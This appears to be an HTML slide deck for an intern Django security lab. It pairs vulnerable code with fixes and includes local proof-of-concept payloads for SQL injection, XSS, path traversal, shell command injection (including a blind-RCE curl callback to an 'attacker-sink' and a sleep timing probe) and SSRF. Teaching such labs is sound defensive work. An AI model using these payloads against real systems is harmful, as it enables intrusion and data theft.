<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#111418"><title>Django Backend Security Lab</title>
<style>
:root{--bg:#111418;--surface:#1b2027;--surface2:#242b34;--text:#f2f4f8;--muted:#a6adbb;--accent:#7dd3fc;--success:#8bd17c;--warning:#f2b84b;--danger:#ef6f6c;--line:#35404c;--pad:clamp(28px,5vw,78px)}*{box-sizing:border-box}html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;overflow:hidden}body:before{content:"";position:fixed;inset:0;pointer-events:none;opacity:.14;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:32px 32px}.deck{height:100%;position:relative}.slide{position:absolute;inset:0;display:grid;grid-template-rows:auto 1fr auto;padding:clamp(58px,7vh,86px) var(--pad) clamp(52px,6vh,72px);opacity:0;visibility:hidden;transform:translateX(24px);transition:opacity .2s,transform .2s;overflow:auto}.slide.active{opacity:1;visibility:visible;transform:none}.slide.exit{transform:translateX(-24px)}.eyebrow{display:flex;align-items:center;gap:12px;color:var(--accent);font:700 12px/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.18em;text-transform:uppercase}.eyebrow:before{content:"";width:28px;height:2px;background:currentColor}.content{width:min(1180px,100%);align-self:center}.wide{width:100%}h1,h2,h3,p{margin-top:0}h1{font-size:clamp(48px,7vw,92px);line-height:.98;letter-spacing:-.045em;max-width:1080px;margin-bottom:28px}h2{font-size:clamp(38px,5vw,68px);line-height:1.04;letter-spacing:-.035em;margin-bottom:24px}h3{font-size:clamp(19px,2vw,27px);line-height:1.15;margin-bottom:14px}.lead{font-size:clamp(21px,2.4vw,34px);line-height:1.38;color:var(--muted);max-width:960px}.giant{font-size:clamp(32px,5vw,66px);line-height:1.16;letter-spacing:-.03em;max-width:1120px}.accent{color:var(--accent)}.success{color:var(--success)}.warning{color:var(--warning)}.danger{color:var(--danger)}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:18px}.grid.three{grid-template-columns:repeat(3,minmax(0,1fr))}.card{background:linear-gradient(145deg,var(--surface),#171b21);border:1px solid var(--line);border-radius:15px;padding:clamp(19px,2.4vw,31px);box-shadow:0 12px 40px rgba(0,0,0,.18)}.card.vuln{border-color:rgba(239,111,108,.55)}.card.safe{border-color:rgba(139,209,124,.45)}.card h3{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--accent)}.card.vuln h3{color:var(--danger)}.card.safe h3{color:var(--success)}ul{font-size:clamp(18px,1.65vw,24px);line-height:1.5;padding-left:1.15em;margin:10px 0 0}li{margin:.23em 0}li::marker{color:var(--accent)}pre{margin:0;background:#0b0e11;border:1px solid #303944;border-radius:13px;padding:19px 21px;overflow:auto;white-space:pre-wrap;color:#d9dee7;font:clamp(13px,1.3vw,19px)/1.52 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;box-shadow:inset 0 1px rgba(255,255,255,.03)}code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}.kw{color:#c792ea}.fn{color:#82aaff}.str{color:#c3e88d}.var{color:#f2b84b}.cm{color:#71808f}.bad{color:var(--danger);background:rgba(239,111,108,.08)}.good{color:var(--success);background:rgba(139,209,124,.08)}.inline{color:var(--accent);background:#0b0e11;border:1px solid var(--line);border-radius:6px;padding:.1em .35em}.split{display:grid;grid-template-columns:minmax(0,1.08fr) minmax(300px,.92fr);gap:28px;align-items:center}.prompt{border-left:4px solid var(--warning);background:rgba(242,184,75,.07);padding:19px 23px;border-radius:0 12px 12px 0;font-size:clamp(21px,2.25vw,32px);line-height:1.35}.prompt small{display:block;color:var(--warning);font:700 11px/1.2 ui-monospace,monospace;letter-spacing:.16em;text-transform:uppercase;margin-bottom:9px}.principle{display:flex;align-items:center;gap:10px;color:var(--muted);font:600 13px/1.25 ui-monospace,monospace}.principle:before{content:"// principle";color:var(--success)}.diagram{display:flex;align-items:center;justify-content:center;gap:14px;min-height:190px}.diagram.stack{flex-direction:column}.node{min-width:155px;padding:18px;border:1px solid var(--line);border-radius:12px;background:var(--surface);text-align:center;font:700 16px/1.35 ui-monospace,monospace}.node.user{border-color:var(--accent)}.node.power{border-color:var(--warning)}.node.danger{border-color:var(--danger)}.arrow{position:relative;width:64px;height:2px;background:var(--accent)}.stack .arrow{transform:rotate(90deg);margin:14px}.arrow:after{content:"";position:absolute;right:-1px;top:-4px;border-left:9px solid var(--accent);border-top:5px solid transparent;border-bottom:5px solid transparent}.arrow.red{background:var(--danger)}.arrow.red:after{border-left-color:var(--danger)}.demo{display:inline-flex;align-items:center;gap:10px;margin-top:17px;color:var(--bg);background:var(--accent);text-decoration:none;border-radius:9px;padding:12px 16px;font:800 14px/1 ui-monospace,monospace;box-shadow:0 5px 20px rgba(125,211,252,.14)}.demo:after{content:"↗"}.demo:hover{filter:brightness(1.08)}.path{font:600 clamp(14px,1.25vw,18px)/1.5 ui-monospace,monospace;color:var(--accent);word-break:break-all}.tag{display:inline-flex;padding:6px 9px;border:1px solid var(--line);border-radius:999px;font:700 11px/1 ui-monospace,monospace;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:22px}.timeline{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:30px}.time{padding:16px 14px;border-top:3px solid var(--line);background:var(--surface);min-height:92px}.time strong{display:block;color:var(--accent);font:800 15px ui-monospace,monospace;margin-bottom:8px}.time.break{border-color:var(--warning)}.chrome{position:fixed;z-index:50;left:0;right:0;bottom:0;height:38px;background:rgba(11,14,17,.96);border-top:1px solid var(--line);display:flex;align-items:center;padding:0 18px;gap:16px;color:var(--muted);font:700 11px ui-monospace,monospace;letter-spacing:.04em}.track{height:3px;position:absolute;left:0;right:0;top:-1px;background:#27303a}.bar{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--success));transition:width .2s}.counter{color:var(--text)}.phase{margin-left:auto;color:var(--accent)}.key{border:1px solid #4a5663;border-bottom-width:2px;border-radius:4px;padding:2px 5px;color:var(--text)}.controls{position:fixed;right:18px;top:16px;z-index:60;display:flex;gap:8px}.control{border:1px solid var(--line);background:rgba(27,32,39,.9);color:var(--muted);border-radius:8px;padding:8px 10px;font:700 11px ui-monospace,monospace;cursor:pointer}.control:hover{color:var(--text);border-color:var(--accent)}.timer{display:flex;align-items:center;gap:14px;margin-top:22px}.clock{font:800 clamp(40px,6vw,78px)/1 ui-monospace,monospace;color:var(--warning);letter-spacing:-.05em}.timer button,.reveal{border:1px solid var(--line);background:var(--surface2);color:var(--text);border-radius:8px;padding:10px 13px;font:700 12px ui-monospace,monospace;cursor:pointer}.overview,.help{position:fixed;inset:0;z-index:100;background:rgba(9,11,14,.97);padding:45px;display:none;overflow:auto}.overview.open{display:block}.overview-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px}.overview button{text-align:left;min-height:100px;border:1px solid var(--line);border-radius:10px;background:var(--surface);color:var(--text);padding:14px;cursor:pointer}.overview button:hover{border-color:var(--accent)}.overview button span{display:block;color:var(--accent);font:700 10px ui-monospace,monospace;margin-bottom:8px}.help.open{display:grid;place-items:center}.helpbox{width:min(520px,90vw);background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:28px}.helpbox table{width:100%;border-collapse:collapse}.helpbox td{padding:10px;border-bottom:1px solid var(--line)}.answer{display:none;margin-top:14px;color:var(--success);font-size:22px}.answer.show{display:block}@media(max-width:820px){.split,.grid,.grid.three{grid-template-columns:1fr}.slide{padding-top:70px}.timeline{grid-template-columns:1fr 1fr}.diagram{display:none}h1{font-size:48px}.hint{display:none}}@media print{html,body{overflow:visible}.controls,.chrome{display:none}.slide{position:relative;opacity:1;visibility:visible;transform:none;page-break-after:always;height:100vh}}
</style></head>
<body><main class="deck" id="deck"></main><div class="controls"><button class="control" id="overviewBtn">Overview · O</button><button class="control" id="helpBtn">Keys · ?</button></div><div class="chrome"><span class="counter" id="counter"></span><span class="hint"><span class="key">←</span> <span class="key">→</span> <span class="key">space</span> <span class="key">j</span> <span class="key">k</span></span><span class="phase" id="phase"></span><div class="track"><div class="bar" id="bar"></div></div></div><aside class="overview" id="overview"><div class="eyebrow" style="margin-bottom:24px">Slide overview · click to jump · O to close</div><div class="overview-grid" id="overviewGrid"></div></aside><aside class="help" id="help"><div class="helpbox"><h3>Presenter keys</h3><table><tr><td><span class="key">→</span> <span class="key">space</span> <span class="key">j</span></td><td>Next slide</td></tr><tr><td><span class="key">←</span> <span class="key">k</span></td><td>Previous slide</td></tr><tr><td><span class="key">o</span></td><td>Slide overview</td></tr><tr><td><span class="key">f</span></td><td>Fullscreen</td></tr><tr><td><span class="key">?</span> <span class="key">esc</span></td><td>Help / close</td></tr></table></div></aside>
<script>
var S=[
["OPEN","Django Backend Security",`<div class='tag'>4-hour intern lab · Terminal + Architecture</div><h1>Django Backend<br><span class='accent'>Security</span></h1><p class='lead'>From framework safety rails to privileged backend mistakes.</p><div class='path'>$ review → predict → exploit → fix → extract a principle</div>`,"Security starts where trust crosses a boundary."],
["OPEN","Core message",`<p class='giant'>The application decides <span class='accent'>what should happen</span>.<br><br>The infrastructure limits <span class='success'>how bad it can get</span> when the application is wrong.</p>`,"Different controls protect different trust boundaries."],
["OPEN","Session shape",`<h2>Four hours. Two 15-minute breaks.</h2><div class='timeline'><div class='time'><strong>00:00</strong>Opening + method</div><div class='time'><strong>00:15</strong>Part 1 · safety rails</div><div class='time'><strong>01:05</strong>Whitebox 1 + review</div><div class='time break'><strong>01:30</strong>Break · 15 min</div><div class='time'><strong>01:45</strong>Part 2 · integrations</div><div class='time'><strong>02:55</strong>Whitebox 2</div><div class='time break'><strong>03:15</strong>Break · 15 min</div><div class='time'><strong>03:30</strong>Review + CTF runway</div></div><p class='muted' style='margin-top:18px'>Total break time: 30 minutes. Active session time: 3.5 hours.</p>`,"Alternate explanation, prediction, proof, and repair."],
["OPEN","Teaching question",`<h2>What does this code <span class='warning'>trust</span> that it shouldn’t?</h2><div class='grid'><div class='card'><h3>Trace the chooser</h3><p class='lead'>Who chose this value?</p></div><div class='card'><h3>Classify it</h3><p class='lead'>Data, code, path, URL, or action?</p></div><div class='card'><h3>Locate authority</h3><p class='lead'>Is the backend acting with its own authority?</p></div><div class='card'><h3>Define the limit</h3><p class='lead'>What should the user actually steer?</p></div></div>`,"Reason from trust and authority, not vocabulary."],
["PART 1","Where Django helps",`<div class='split'><div><h2>Strong safety rails<br><span class='success'>if we stay on them.</span></h2><ul><li>ORM query construction</li><li>Template autoescaping</li><li>CSRF middleware</li><li>Host and framing protections</li></ul></div><div class='diagram stack'><div class='node user'>untrusted request</div><div class='arrow'></div><div class='node power'>Django safe path</div><div class='arrow'></div><div class='node'>database · browser</div></div></div>`,"Know when your code bypasses the framework."],
["PART 1 · SQLI","SQL injection · safe path",`<div class='split'><div><h2>Search is data.</h2><p class='lead'>The ORM keeps the search term separate from query structure.</p><a class='demo' href='http://127.0.0.1:8000/part1/sql/safe/?q=public' target='_blank'>Open safe search</a></div><pre><span class='var'>q</span> = request.GET.get(<span class='str'>"q"</span>, <span class='str'>""</span>)\nproducts = Product.objects.filter(\n  name__icontains=q\n) | Product.objects.filter(\n  description__icontains=q\n)</pre></div>`,"Keep user input as data, not query code."],
["PART 1 · SQLI","SQL injection · vulnerable",`<h2>A string became query syntax.</h2><pre>sql = <span class='kw'>f</span><span class='str'>"""\n SELECT id, name, owner, description\n FROM demos_product\n WHERE name LIKE '%<span class='bad'>{q}</span>%' OR description LIKE '%<span class='bad'>{q}</span>%'\n"""</span>\ncursor.execute(sql)</pre><div class='prompt' style='margin-top:18px'><small>Ask the room</small>What happens when <code class='inline'>q</code> changes the query structure?</div>`,"Keep user input as data, not query code."],
["PART 1 · SQLI","SQL injection · exploit + fix",`<div class='grid'><div class='card vuln'><h3>PoC</h3><pre>GET /part1/sql/vulnerable/\n ?q=<span class='bad'>' OR 1=1 --</span></pre><p class='muted'>The quote closes the LIKE, OR adds a true branch, and -- comments out the rest.</p><a class='demo' href='http://127.0.0.1:8000/part1/sql/vulnerable/?q=%27%20OR%201%3D1%20--' target='_blank'>Run local PoC</a></div><div class='card safe'><h3>Parameterized</h3><pre>pattern = <span class='kw'>f</span><span class='str'>"%{q}%"</span>\ncursor.execute(\n  sql,\n  <span class='good'>[pattern, pattern]</span>\n)</pre><p class='muted'>The driver sends values separately from the SQL text, so input cannot change query structure.</p><p class='muted'>Internally the SQL keeps placeholder tokens (<code class='inline'>%s</code>); the driver ships the actual value as data and escapes it, the server parses only your fixed statement, then binds the value into it.</p></div></div>`,"Parameters preserve the code/data boundary."],
["PART 1 · XSS","XSS · safe vs unsafe",`<div class='split'><div><h2>Content or code?</h2><p class='lead'>A report upload gets a preview. Django escapes by default; risk appears when a developer asserts trust.</p><pre>preview = path.read_text()\n\n<span class='cm'># bypasses escaping</span>\nrendered = <span class='bad'>mark_safe(preview)</span></pre><a class='demo' href='http://127.0.0.1:8000/part1/xss/upload/' target='_blank'>Open upload demo</a></div><div class='prompt'><small>Ask the room</small>Who decided this content is safe?</div></div>`,"User content should render as content, not code."],
["PART 1 · XSS","XSS · exploit + fix",`<div class='grid'><div class='card vuln'><h3>Upload + trusted preview</h3><p class='lead'>Upload an SVG with a payload; the preview renders it as HTML.</p><a class='demo' href='http://127.0.0.1:8000/part1/xss/preview/?name=welcome.svg' target='_blank'>Open vulnerable preview</a></div><div class='card safe'><h3>Escape it</h3><pre>rendered =\n <span class='good'>format_html("{}", preview)</span>\n<span class='cm'># or let the template escape</span></pre><a class='demo' href='http://127.0.0.1:8000/part1/xss/preview/fixed/?name=welcome.svg' target='_blank'>Open escaped preview</a><p class='muted'>Audit mark_safe, safe, and disabled autoescape.</p></div></div>`,"Trust-marking is a security decision."],
["PART 1 · COOKIES","What is a cookie?",`<div class='split'><div><h2>A name-value note the <span class='accent'>browser</span> keeps and <span class='warning'>re-sends on every request.</span></h2><p class='lead'>The server sets it, the browser stores it, then re-attaches it to every later request for that site.</p><pre><span class='kw'>req 1</span>  HTTP/1.1 200 OK\n\t\t\t\t\t<span class='str'>Set-Cookie: sessionid=abc123</span>\n\n<span class='kw'>req 2</span>  GET /transfer/ HTTP/1.1\n\t\t\t\t\t<span class='str'>Cookie: sessionid=abc123</span></pre></div><div class='diagram stack'><div class='node danger'>client browser</div><div class='arrow'></div><div class='node'>Cookie: sessionid=abc123</div><div class='arrow'></div><div class='node power'>Django server</div></div></div>`,"Cookies give the server continuity across stateless requests."],
["PART 1 · CSRF","CSRF · intent boundary",`<div class='split'><div><h2>A cookie proves a session.<br><span class='danger'>Not intent.</span></h2><p class='lead'>A hidden cross-site form posts to your app. The browser attaches the victim's session cookie, so the backend sees "a logged-in browser" and treats it as consent.</p><pre><span class='kw'>@csrf_protect</span>\ndef transfer(request):\n  if request.method == <span class='str'>"POST"</span>:\n    transfer_money(request.user, amount)\n\n&lt;form method=<span class='str'>"post"</span>&gt;\n  <span class='good'>{% csrf_token %}</span></pre><a class='demo' href='http://127.0.0.1:8000/part1/csrf/safe/' target='_blank'>Open protected form</a></div><div class='diagram stack'><div class='node danger'>attacker page</div><div class='arrow red'></div><div class='node user'>victim browser + cookies</div><div class='arrow red'></div><div class='node power'>Django action</div></div><p class='muted' style='margin-top:18px'><strong>How Django solves it:</strong> {% csrf_token %} emits a secret per-session token. The CSRF middleware tags it into a cookie and rejects unsafe requests unless the posted token matches. The cross-site form never received the token, so its POST fails.</p></div>`,"A logged-in browser is not proof of intentional action."],
["PART 1 · CSRF","CSRF · bypass + repair",`<div class='grid'><div class='card vuln'><h3>The bypass</h3><pre><span class='bad'>@csrf_exempt</span>\ndef transfer(request):\n  if request.method == <span class='str'>"POST"</span>:\n    transfer_money(...)</pre><a class='demo' href='http://127.0.0.1:8000/part1/csrf/attack-page/' target='_blank'>Open attack page</a></div><div class='card safe'><h3>The repair</h3><ul><li>State changes use POST</li><li>Keep middleware enabled</li><li>Render the CSRF token</li><li>Do not confuse session with intent</li></ul></div></div>`,"Require both identity and request intent."],
["PART 1 · CORS","CORS is not CSRF",`<h2>Send ≠ read.</h2><div class='grid'><div class='card'><h3>CSRF asks</h3><p class='lead'>Can another site make the victim’s browser <strong>send</strong> a request with cookies?</p></div><div class='card'><h3>CORS asks</h3><p class='lead'>Can another site’s JavaScript <strong>read</strong> the response?</p></div></div><div class='prompt' style='margin-top:18px'><small>Ask the room</small>If CORS blocks reading, can a normal HTML form still send a state-changing POST?</div>`,"CORS governs browser reads; CSRF protection establishes intent."],
// ["PART 1","Clickjacking",`<div class='split'><div><h2>The user clicks the real app without seeing it.</h2><pre>MIDDLEWARE = [\n <span class='str'>"django.middleware.clickjacking.\n XFrameOptionsMiddleware"</span>,\n]\n\nHTTP/1.1 200 OK\n<span class='good'>X-Frame-Options: DENY</span></pre><a class='demo' href='http://127.0.0.1:8000/part1/clickjacking/protected/' target='_blank'>Open protected page</a></div><div class='diagram stack'><div class='node danger'>opaque attacker frame</div><div class='arrow red'></div><div class='node user'>misdirected click</div><div class='arrow red'></div><div class='node power'>real app action</div></div></div>`,"Framing controls reduce UI deception."],
["PART 1","Open redirect · host trust",`<div class='grid'><div class='card vuln'><h3>User decides destination</h3><pre>next_url = request.GET.get(\n <span class='str'>"next"</span>, <span class='str'>"/"</span>\n)\n<span class='bad'>return redirect(next_url)</span></pre><a class='demo' href='http://127.0.0.1:8000/part1/redirect/vulnerable/?next=https://example.com' target='_blank'>Run redirect PoC</a></div><div class='card safe'><h3>Server validates</h3><pre>allowed =\n <span class='good'>url_has_allowed_host_and_scheme</span>(\n  next_url,\n  allowed_hosts={request.get_host()},\n  require_https=request.is_secure(),\n )</pre></div></div>`,"Users request destinations; servers approve them."],
["PART 1","Deployment settings",`<div class='split'><div><h2>Correct settings need a matching deployment.</h2><p class='lead'>Each flag trusts parts of the environment. If the deployment lies, the protection silently turns off.</p><pre><span class='good'>SECURE_SSL_REDIRECT</span> = True\n<span class='good'>SESSION_COOKIE_SECURE</span> = True\n<span class='good'>CSRF_COOKIE_SECURE</span> = True\n<span class='good'>SECURE_HSTS_SECONDS</span> = 31536000\n\nSECRET_KEY = os.environ[\n <span class='str'>"DJANGO_SECRET_KEY"</span>\n]</pre></div><div class='card wide'><h3>What each one does</h3><ul><li><span class='good'>SECURE_SSL_REDIRECT</span> — every HTTP request gets 302&#8594;HTTPS. Needs a proxy/load balancer already terminating TLS, or redirects loop.</li><li><span class='good'>SESSION_COOKIE_SECURE</span> — the session cookie is sent only over HTTPS, so an eavesdropper can never replay it over plain HTTP.</li><li><span class='good'>CSRF_COOKIE_SECURE</span> — same rule for the CSRF token cookie; a stolen token would let an attacker forge requests.</li><li><span class='good'>SECURE_HSTS_SECONDS</span> — tells the browser "always use HTTPS for this site for 1 year," preventing it from ever downgrading to HTTP.</li><li><span class='good'>SECRET_KEY</span> — signs sessions, tokens, and cookies. From env, not committed code; a leaked key lets anyone forge sessions and CSRF tokens.</li></ul></div></div>`,"Configuration is part of the security model."],
["PART 1 · BRIDGE","IDOR · ownership bridge",`<div class='grid'><div class='card vuln'><h3>Authenticated, but authorized?</h3><pre>document = Document.objects.get(\n <span class='bad'>id=document_id</span>\n)</pre><p class='muted'>Django knows who the requester is, not which document belongs to them.</p></div><div class='card safe'><h3>Scope the lookup</h3><pre>document = get_object_or_404(\n Document,\n id=document_id,\n <span class='good'>project__members=request.user</span>,\n)</pre></div></div>`,"Authentication asks who; authorization asks whether this object."],
["CHALLENGE 1","Whitebox Challenge 1",`<div class='split'><div><h2>The support desk trusts too much.</h2><p class='lead'><strong>Scenario:</strong> an authenticated support desk. Chain three bugs to drag a private incident into the open.</p><ul><li>SQLi in the ticket search</li><li>IDOR on ticket detail</li><li>Open redirect → staff handover page</li></ul><a class='demo' href='https://challenge1.localhost/' target='_blank'>Open challenge · 3 flags</a></div><div><div class='tag'>Optional room timer</div><div class='timer' data-minutes='20'><div class='clock'>20:00</div><button class='timer-toggle'>Start</button><button class='timer-reset'>Reset</button></div><div class='prompt' style='margin-top:22px'><small>Review question</small>Which protection was bypassed, or which business rule was missing?</div></div></div>`,"Inspect the trust boundary, then prove the consequence."],
["BREAK","Break 1 of 2",`<div class='tag'>01:30 → 01:45</div><h1>15-minute<br><span class='warning'>break.</span></h1><p class='lead'>When we return: the backend becomes a bridge to files, commands, networks, workers, and control planes.</p>`,"First reset after roughly 90 minutes."],
["PART 2","Where the backend reaches out",`<div class='split'><div><h2>The backend becomes a <span class='warning'>capability bridge.</span></h2><ul><li>Filesystem</li><li>Shell and tools</li><li>Outbound network</li><li>Background workers</li><li>Privileged services</li></ul><a class='demo' href='http://127.0.0.1:8000/part2/integration/' target='_blank'>Open integration demo hub</a></div><div class='diagram stack'><div class='node user'>user input</div><div class='arrow red'></div><div class='node power'>Django backend</div><div class='arrow'></div><div class='node danger'>more powerful system</div></div></div>`,"Every integration creates a new trust boundary."],
["PART 2 · FILES","Path traversal · feature",`<div class='split'><div><h2>Download a generated report.</h2><p class='lead'>The question is not “is this a string?” It is “who chose the path?”</p><a class='demo' href='http://127.0.0.1:8000/part2/files/vulnerable/?name=alice-summary.txt' target='_blank'>Open normal report</a></div><div class='prompt'><small>Ask the room</small>Is this value data, a resource ID, or a filesystem path?</div></div>`,"Users choose resources, not filesystem paths."],
["PART 2 · FILES","Path traversal · exploit + fix",`<div class='grid'><div class='card vuln'><h3>Direct path influence</h3><pre>name = request.GET.get(<span class='str'>"name"</span>)\npath = REPORT_DIR / <span class='bad'>name</span>\ncontent = path.read_text()\n\n?name=<span class='bad'>../private/internal-note.txt</span></pre><a class='demo' href='http://127.0.0.1:8000/part2/files/vulnerable/?name=../private/internal-note.txt' target='_blank'>Run traversal PoC</a></div><div class='card safe'><h3>Resource lookup</h3><pre>ALLOWED_REPORTS = {\n <span class='str'>"alice-summary"</span>:\n <span class='str'>"alice-summary.txt"</span>,\n}\nfilename = ALLOWED_REPORTS.get(\n <span class='good'>report_id</span>\n)</pre></div></div>`,"Map opaque choices to server-owned paths."],
["PART 2 · RCE","Subprocess · feature",`<div class='split'><div><h2>Run diagnostics for a backend target.</h2><p class='lead'>A helpful operational feature crosses into a command interpreter.</p><a class='demo' href='http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api' target='_blank'>Open normal diagnostic</a></div><div class='prompt'><small>Ask the room</small>When does input stop being data and become command syntax?</div></div>`,"Treat command execution as a privilege boundary."],
["PART 2 · RCE","Visible command injection",`<div class='grid'><div class='card vuln'><h3>String + shell</h3><pre>command = <span class='kw'>f</span><span class='str'>"echo checking-<span class='bad'>{target}</span>"</span>\nsubprocess.run(\n command,\n <span class='bad'>shell=True</span>,\n capture_output=True,\n)</pre></div><div class='card vuln'><h3>PoC</h3><pre>GET /part2/subprocess/vulnerable/\n ?target=<span class='bad'>api; id #</span></pre><p class='lead'>The response proves execution.</p><a class='demo' href='http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api%3B%20id%20%23' target='_blank'>Run visible PoC</a></div></div>`,"Shell syntax turns input into instructions."],
["PART 2 · RCE","Blind RCE · webhook callback",`<div class='split'><div><h2>No output does not mean no execution.</h2><pre>subprocess.run(\n command, shell=True,\n <span class='cm'>stdout=DEVNULL, stderr=DEVNULL</span>\n)\nreturn HttpResponse(<span class='str'>"Diagnostic accepted"</span>)</pre><p class='path'>target=api; curl http://127.0.0.1:8000/part2/webhooks/attacker-sink/?source=blind-rce #</p><a class='demo' href='http://127.0.0.1:8000/part2/webhooks/events/' target='_blank'>Check callback events</a></div><div class='diagram stack'><div class='node danger'>injected command</div><div class='arrow red'></div><div class='node power'>server process</div><div class='arrow red'></div><div class='node user'>attacker receiver</div></div></div>`,"Out-of-band effects can prove blind execution."],
["PART 2 · RCE","Blind RCE · timing side channel",`<h2>Make execution consume measurable time.</h2><pre>time curl -sS 'http://127.0.0.1:8000/part2/subprocess/blind/\n ?target=api%3B%20<span class='bad'>sleep%202</span>%20%23'</pre><div class='grid' style='margin-top:18px'><div class='card'><h3>Baseline</h3><p class='giant'>≈ 20 ms</p></div><div class='card vuln'><h3>Payload</h3><p class='giant'>≈ 2,020 ms</p></div></div>`,"Timing is observable output."],
["PART 2 · RCE","Subprocess · repair",`<div class='split'><div><h2>Narrow syntax and capability.</h2><pre>ALLOWED_TARGETS = {<span class='str'>"api"</span>, <span class='str'>"worker"</span>, <span class='str'>"database"</span>}\nif target not in ALLOWED_TARGETS:\n return HttpResponse(<span class='str'>"Unknown"</span>, status=400)\n\nsubprocess.run(\n <span class='good'>["printf", "checking %s\\n", target]</span>\n)</pre></div><div><ul><li>Avoid shell=True</li><li>Use argument arrays</li><li>Allowlist operations and targets</li><li>Restrict OS permissions</li></ul></div></div>`,"Safe syntax plus least privilege limits consequence."],
["PART 2 · SSRF","SSRF · feature",`<div class='split'><div><h2>“Test this webhook.”</h2><p class='lead'>The request comes from the backend’s network position, not the user’s.</p><a class='demo' href='http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/public-api/' target='_blank'>Open normal fetch</a></div><div class='prompt'><small>Ask the room</small>What can the backend reach that the user cannot?</div></div>`,"A URL fetch is network delegation."],
["PART 2 · SSRF","SSRF · exploit",`<div class='grid'><div class='card vuln'><h3>Any URL, server authority</h3><pre>url = request.GET[<span class='str'>"url"</span>]\nwith urlopen(<span class='bad'>url</span>, timeout=2) as r:\n body = r.read(500)</pre></div><div class='card vuln'><h3>Internal target</h3><pre>?url=http://127.0.0.1:8000/\n <span class='bad'>part2/fetch/internal-admin/</span></pre><a class='demo' href='http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/' target='_blank'>Run SSRF PoC</a></div></div>`,"Validate destinations, not just URL shape."],
["PART 2 · SSRF","SSRF · layered defense",`<h2>Policy in code. Boundaries in the network.</h2><div class='grid three'><div class='card safe'><h3>Destination</h3><ul><li>Allowed schemes</li><li>Explicit hosts</li><li>Block private ranges</li></ul></div><div class='card safe'><h3>Resolution</h3><ul><li>Re-check redirects</li><li>Handle DNS changes</li><li>Strict timeouts</li></ul></div><div class='card safe'><h3>Blast radius</h3><ul><li>Egress policy</li><li>No ambient credentials</li><li>Isolated fetcher</li></ul></div></div>`,"Application policy and egress controls solve different layers."],
["PART 2 · TASKS","Background task parameter trust",`<div class='grid'><div class='card vuln'><h3>Request defines the job</h3><pre>action = request.GET[<span class='str'>"action"</span>]\ndocument_id = request.GET[<span class='str'>"document_id"</span>]\nenqueue_task(\n <span class='bad'>action=action,\n document_id=document_id</span>\n)</pre><p class='path'>?action=email_owner&amp;document_id=2</p></div><div class='card safe'><h3>Server constructs the job</h3><pre>document = get_object_or_404(\n Document,\n <span class='good'>owner=request.user.username</span>\n)\nenqueue_task(\n <span class='good'>action="export"</span>,\n document_id=document.id\n)</pre></div></div>`,"Workers must receive and re-check authorization-aware inputs."],
["PART 2 · INTEGRATION","Unsafe privileged integration",`<div class='split'><div><h2>The backend can. The user asks.<br><span class='danger'>Who defines the limits?</span></h2><pre>target_user = request.GET.get(\n <span class='str'>"target_user"</span>, user\n)\naction = request.GET.get(<span class='str'>"action"</span>, <span class='str'>"restart"</span>)\ncontrol_plane.perform(\n <span class='bad'>action, target_user</span>\n)</pre></div><div class='diagram stack'><div class='node user'>limited user</div><div class='arrow red'></div><div class='node power'>privileged backend</div><div class='arrow red'></div><div class='node danger'>control plane</div></div></div>`,"Do not let users freely steer backend authority."],
["PART 2 · INTEGRATION","Privileged integration · repair",`<div class='grid'><div class='card vuln'><h3>User-steered authority</h3><pre>?user=alice\n &amp;<span class='bad'>target_user=bob</span>\n &amp;<span class='bad'>action=snapshot</span></pre><a class='demo' href='http://127.0.0.1:8000/part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot' target='_blank'>Run privileged PoC</a></div><div class='card safe'><h3>Server-derived intent</h3><pre>result = control_plane.perform(\n <span class='good'>"restart"</span>,\n <span class='good'>request.user.username</span>\n)</pre><p class='lead'>Expose a business operation, not a generic control-plane wrapper.</p></div></div>`,"Narrow APIs make allowed intent explicit."],
["CHALLENGE 2","Whitebox Challenge 2",`<div class='split'><div><h2>The on-call console reaches too far.</h2><p class='lead'><strong>Scenario:</strong> an on-call automation console. Two bridges turn into two exploits, same process, two flavors.</p><ul><li>RCE through the diagnostics runner</li><li>SSRF through the webhook tester</li></ul><a class='demo' href='https://challenge2.localhost/' target='_blank'>Open challenge · 2 flags</a></div><div><div class='tag'>Optional room timer</div><div class='timer' data-minutes='20'><div class='clock'>20:00</div><button class='timer-toggle'>Start</button><button class='timer-reset'>Reset</button></div><div class='prompt' style='margin-top:22px'><small>Review question</small>What authority did the backend have, and what did the user get to steer?</div></div></div>`,"Follow data until it becomes an action."],
["BREAK","Break 2 of 2",`<div class='tag'>03:15 → 03:30</div><h1>15-minute<br><span class='warning'>break.</span></h1><p class='lead'>Return for the Challenge 2 review, defense in depth, and the final blackbox CTF runway.</p>`,"Second reset after another roughly 90-minute block."],
